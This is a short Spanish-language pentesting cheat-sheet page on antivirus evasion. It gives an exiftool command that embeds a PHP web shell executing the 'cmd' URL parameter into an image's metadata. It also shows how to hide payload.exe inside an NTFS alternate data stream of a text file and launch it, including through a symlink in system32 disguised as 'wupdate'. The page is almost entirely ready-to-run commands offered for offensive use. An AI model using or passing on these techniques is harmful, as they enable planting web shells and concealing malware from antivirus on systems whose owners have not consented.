---
title: "Obfuscation Av Evasion"
layout: "single"
category: "Varios"
slug: "varios/obfuscation-av-evasion"
date: "2025-09-30"
---

### Exiftool

#### Incluir PHP en imagen
Lo primero que necesitamos es la imagen que vamos a utilizar para cargar la Shell. Una vez descargada, comenzamos a modificarla.

El comando para ello es:
```bash
exiftool -Comment='<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ nombre_imagen.extensión
```

### Alternate data streams ADS (Para windows)
Con ADS podemos esconder ficheros en metadatos de otros ficheros para tratar de evadir un antivirus o pasar desapercibido.

Teniendo un fichero payload.exe lo escondemos en, por ejemplo un txt.
```bash
type payload.exe > fichero.txt:payload.exe # O el nombre que le queramos dar
```

#### Opcion 1
Llamar al ejecutable con la ruta absoluta
```bash
start C:\temp\fichero.txt:payload.exe
```

#### Opcion 2
 Creariamos un enlace simbólico a otro fichero.exe en system32 que al llamarlo, ejecutaría el payload. cabe mencionar que se necesitan permisos para escribir en system32
```bash
mklink C:\windows\system32\wupdate C:\tmp\fichero.txt:payload.exe

#ejecutar. al estar system32 en el path se puede llamar de forma relativa
wupdate
```